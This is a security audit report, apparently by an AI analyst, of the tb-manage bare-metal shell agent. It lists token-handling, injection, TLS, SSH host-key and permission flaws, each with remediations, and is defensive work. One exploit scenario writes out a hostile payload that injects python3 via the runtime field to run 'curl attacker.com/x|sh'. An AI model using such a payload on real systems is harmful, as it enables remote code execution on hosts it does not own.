# Security Audit: tb-manage

**Date:** 2026-02-27  
**Auditor:** Aurelia (AI Security Analyst)  
**Repo:** github.com/escape-velocity-ventures/tb-manage (PUBLIC)  
**Scope:** Full source code review, dependency audit, threat modeling  

---

## Executive Summary

tb-manage is a bare-metal infrastructure agent that provides authenticated users with full PTY shell access to registered machines via WebSocket. The codebase is **publicly readable**, meaning every vulnerability is discoverable by attackers.

**Overall risk: HIGH.** The agent's core design grants full shell access to the host user — this is inherently dangerous and makes the authentication layer the single most critical control. Several findings weaken that control or expand the attack surface beyond what's necessary.

### Critical Stats
- **3 CRITICAL** findings (token in URL, shell injection via target params, token in plaintext config)
- **4 HIGH** findings
- **5 MEDIUM** findings  
- **3 LOW** findings
- **2 INFO** findings

---

## Findings Summary

| # | Severity | Title | Component |
|---|----------|-------|-----------|
| 1 | **CRITICAL** | Token passed as WebSocket query parameter | agent.go |
| 2 | **CRITICAL** | Shell injection via TerminalTarget fields | agent.go / protocol |
| 3 | **CRITICAL** | Token stored in plaintext config & service files | install/*.go, config.go |
| 4 | HIGH | No constant-time token comparison | Server-side (assumed) |
| 5 | HIGH | No TLS enforcement on WebSocket connection | agent.go |
| 6 | HIGH | SSH known_hosts fallback to InsecureIgnoreHostKey | ssh/runner.go |
| 7 | HIGH | Unrestricted command execution via SaaS commands | commands/executor.go |
| 8 | MEDIUM | No session-level authorization | agent.go |
| 9 | MEDIUM | No rate limiting on WebSocket reconnection auth | agent.go |
| 10 | MEDIUM | PTY output flooding — no backpressure | terminal/session.go |
| 11 | MEDIUM | LaunchAgent plist written with 0644 permissions | install/launchd.go |
| 12 | MEDIUM | Config directory created with 0755 | install/common.go |
| 13 | LOW | Environment variable inheritance to PTY | terminal/session.go |
| 14 | LOW | Scan data could disclose sensitive infrastructure | scanner/*.go |
| 15 | LOW | SSH allowlist allows `cat ~/.kube/config` | ssh/allowlist.go |
| 16 | INFO | No message size limits on WebSocket reads | agent.go |
| 17 | INFO | Gorilla WebSocket is archived (but still maintained) | go.mod |

---

## Detailed Findings

### 1. CRITICAL — Token Passed as WebSocket Query Parameter

**File:** `internal/agent/agent.go:connect()`

```go
q := u.Query()
q.Set("token", a.token)
u.RawQuery = q.Encode()
conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
```

**Description:** The authentication token is passed as a URL query parameter (`?token=...`). Query parameters are:
- Logged by web servers, proxies, CDNs, and load balancers
- Visible in browser history (if applicable)
- Stored in Cloudflare access logs (the gateway uses Cloudflare tunnel)
- Potentially cached by intermediate infrastructure

**Exploit Scenario:** An attacker with access to proxy logs, Cloudflare dashboard, or any intermediate infrastructure can extract the token and connect their own agent or impersonate the legitimate one.

**Remediation:** Pass the token in the WebSocket upgrade request headers instead:
```go
headers := http.Header{}
headers.Set("Authorization", "Bearer "+a.token)
conn, _, err := websocket.DefaultDialer.Dial(u.String(), headers)
```

---

### 2. CRITICAL — Shell Injection via TerminalTarget Fields

**File:** `internal/agent/agent.go:buildShellCommand()`

```go
case "docker":
    return []string{runtime, "exec", "-it", target.Container, shell}, "", nil

case "k8s-pod":
    cmd := []string{"kubectl", "exec", "-it", target.Pod, "-n", target.Namespace}
```

**Description:** The `TerminalTarget` fields (`Container`, `Pod`, `Namespace`, `Shell`, `Runtime`, `Name`) come directly from the WebSocket message with **zero validation or sanitization**. While these are passed as `exec.Command` arguments (not through a shell), several vectors remain:

1. **`target.Shell`** can be set to any binary path (e.g., `/usr/bin/python3`, `/bin/rm`)
2. **`target.Runtime`** can be set to any binary (not just `docker`/`podman`)
3. **`target.Name`** for lima targets is passed directly to `limactl shell`
4. **`target.Container`** for docker targets — a container name like `--privileged` could be interpreted as a flag

**Exploit Scenario:** A compromised SaaS gateway sends a `session.open` message with `{"target": {"type": "docker", "runtime": "/usr/bin/python3", "container": "-c", "shell": "import os; os.system('curl attacker.com/x|sh')"}}`. This executes `python3 -c "import os; os.system(...)"`.

**Remediation:**
- Validate `target.Shell` against an allowlist of known shells (`/bin/sh`, `/bin/bash`, `/bin/zsh`, `/bin/fish`)
- Validate `target.Runtime` against `docker` and `podman` only
- Validate `target.Name`, `target.Container`, `target.Pod`, `target.Namespace` with strict regex (alphanumeric, hyphens, dots only)
- Reject any field containing `--` prefix to prevent flag injection

---

### 3. CRITICAL — Token Stored in Plaintext Config & Service Files

**Files:** `internal/install/common.go`, `internal/config/config.go`

```go
data := map[string]interface{}{
    "token":   cfg.Token,
    ...
}
os.WriteFile(DefaultConfigFile, out, 0600)

// BUT: config dir is 0755
os.MkdirAll(DefaultConfigDir, 0755)
```

**Description:** The agent token is stored in plaintext in `/etc/tb-manage/config.yaml`. While the file itself has 0600 permissions, the directory is 0755. Additionally:
- Any process running as the same user can read the token
- The token is also readable via `/proc/<pid>/environ` on Linux (from TB_TOKEN env var)

**Exploit Scenario:** Any local privilege escalation or co-tenant process reads the config file or `/proc/<pid>/environ` to obtain the agent token.

**Remediation:**
- Config directory should be 0700
- Consider OS-native credential stores (macOS Keychain, Linux secret-tool)
- On systemd, use `LoadCredential=` instead of environment variables

---

### 4. HIGH — No Constant-Time Token Comparison (Server-Side)

**Description:** The agent sends its token to the gateway. If the server-side comparison uses `==` instead of `crypto/subtle.ConstantTimeCompare`, timing attacks could leak the token character by character. This finding depends on server implementation but should be verified.

**Remediation:** Ensure the gateway validates tokens using `crypto/subtle.ConstantTimeCompare`. Consider switching to short-lived JWT tokens.

---

### 5. HIGH — No TLS Enforcement on WebSocket Connection

**File:** `internal/agent/agent.go:connect()`

**Description:** The agent connects to whatever URL is configured — `ws://` or `wss://`. There is no validation that the scheme is `wss://`. Combined with Finding #1 (token in query string), a `ws://` connection exposes the token in plaintext.

**Exploit Scenario:** Operator misconfigures `--gateway ws://...`. Token flows in plaintext. Any network observer captures it.

**Remediation:** Reject non-`wss://` URLs in `connect()`.

---

### 6. HIGH — SSH Known Hosts Fallback to InsecureIgnoreHostKey

**File:** `internal/ssh/runner.go`

```go
if cb, err := knownhosts.New(knownHostsFile); err == nil {
    hostKeyCallback = cb
} else {
    hostKeyCallback = ssh.InsecureIgnoreHostKey()
}
```

**Description:** If `~/.ssh/known_hosts` can't be loaded, the SSH runner silently accepts ANY host key, enabling MITM attacks.

**Remediation:** Fail closed — refuse to connect if known_hosts can't be loaded.

---

### 7. HIGH — Unrestricted Command Execution via SaaS Commands

**File:** `internal/commands/executor.go`

**Description:** The command executor accepts destructive actions from the SaaS (`delete_pod`, `force_delete_pod`, `delete_deployment`, `delete_pvc`, `scale`, `cordon_node`) with no local approval, namespace restriction, or audit trail. A compromised SaaS account can delete deployments and PVCs (data loss).

**Remediation:**
- Add namespace allowlisting for commands
- Log all commands to a tamper-evident audit log
- Consider requiring a separate, higher-privilege token for destructive commands

---

### 8. MEDIUM — No Session-Level Authorization

**Description:** Once the WebSocket is authenticated, ANY `session.open` message is accepted for ANY host/cluster target. The agent doesn't verify `msg.HostID` or `msg.ClusterID` match its own identity.

**Remediation:** Validate that session target matches agent identity.

---

### 9. MEDIUM — No Rate Limiting on WebSocket Reconnection Auth

**Description:** While the agent has exponential backoff, there's no server-side rate limiting for authentication attempts visible in this codebase.

**Remediation:** Server-side rate limiting per source IP. Client-side: add jitter to backoff.

---

### 10. MEDIUM — PTY Output Flooding / No Backpressure

**File:** `internal/terminal/session.go:readLoop()`

**Description:** PTY output is read in a tight loop and sent directly to the WebSocket with no backpressure or rate limiting. A command like `yes` or `cat /dev/urandom` produces unlimited output that can exhaust memory or saturate the connection.

**Remediation:** Add a send buffer with maximum size; implement write deadlines on WebSocket messages.

---

### 11. MEDIUM — LaunchAgent Plist Written with 0644

**File:** `internal/install/launchd.go`

**Description:** Plist is world-readable, revealing binary path, arguments, and log locations.

**Remediation:** Use 0600 for user LaunchAgents.

---

### 12. MEDIUM — Config Directory Created with 0755

**File:** `internal/install/common.go`

**Description:** `/etc/tb-manage/` is world-readable+executable. Any user can discover tb-manage is installed.

**Remediation:** Use 0700.

---

### 13. LOW — Full Environment Variable Inheritance to PTY

**File:** `internal/terminal/session.go`

```go
cmd.Env = append(os.Environ(), "TERM=xterm-256color")
```

**Description:** The PTY shell inherits the ENTIRE environment including `TB_TOKEN`, `TB_URL`, `TB_GATEWAY_URL`, `TB_ANON_KEY`. Any terminal user can run `env` to see all secrets.

**Remediation:** Construct a minimal environment for PTY sessions (TERM, HOME, USER, PATH, SHELL only).

---

### 14. LOW — Scan Data Discloses Sensitive Infrastructure

**Description:** The scanner collects and uploads hostnames, IPs, MACs, k8s cluster info, storage, containers, and routes. If the SaaS is breached, this is a complete network map.

**Remediation:** Document collected data; allow opt-out of specific scan phases.

---

### 15. LOW — SSH Allowlist Permits `cat ~/.kube/config`

**File:** `internal/ssh/allowlist.go`

**Description:** The SSH command allowlist permits reading `~/.kube/config`, which contains cluster credentials.

**Remediation:** Parse kubeconfig locally; extract only cluster names, not credentials.

---

### 16. INFO — No WebSocket Message Size Limits

**Description:** No `SetReadLimit` on the WebSocket. A malicious gateway could send a very large message to exhaust memory.

**Remediation:** `a.conn.SetReadLimit(1 << 20)` (1MB max).

---

### 17. INFO — Gorilla WebSocket Library Status

**Description:** Using a pre-release commit pin of gorilla/websocket. No known CVEs but supply chain risk from previously-archived project.

**Remediation:** Monitor for stable releases; consider nhooyr/websocket as alternative.

---

## Dependency Audit

| Package | Version | Status |
|---------|---------|--------|
| `creack/pty` | v1.1.21 | ✅ Current, no known CVEs |
| `gorilla/websocket` | v1.5.4-pre | ⚠️ Pre-release commit pin |
| `golang.org/x/crypto` | v0.48.0 | ✅ Recent |
| `spf13/cobra` | v1.10.2 | ✅ Current |
| `k8s.io/client-go` | v0.35.1 | ✅ Current |
| `gopkg.in/yaml.v3` | v3.0.1 | ✅ Current |

No critical dependency vulnerabilities found.

---

## Hardening Roadmap

### Phase 1 — Immediate (Critical/High)
1. Move token from query parameter to Authorization header
2. Validate all TerminalTarget fields with strict allowlists
3. Enforce wss:// scheme on WebSocket connections
4. Fix SSH known_hosts fallback — fail closed
5. Restrict PTY environment variables — minimal env only
6. Set config directory to 0700

### Phase 2 — Short-term (Medium)
7. Add namespace allowlisting for remote commands
8. Validate session hostId/clusterId against agent identity
9. Add WebSocket message size limits
10. Add PTY output backpressure

### Phase 3 — Medium-term
11. Implement short-lived JWT tokens instead of static tokens
12. Add audit logging for all terminal sessions and commands
13. Add per-session authorization from the gateway
14. Consider mTLS for agent-gateway communication

### Phase 4 — Long-term
15. Command classification (classifier.go is a stub) — AI-based command approval
16. Session recording with tamper-evident storage
17. Multi-factor authentication for terminal access

---

*Report generated 2026-02-27. This audit covers the source code as of the latest commit in the repository. Server-side (gateway) code was not in scope but is referenced where relevant.*
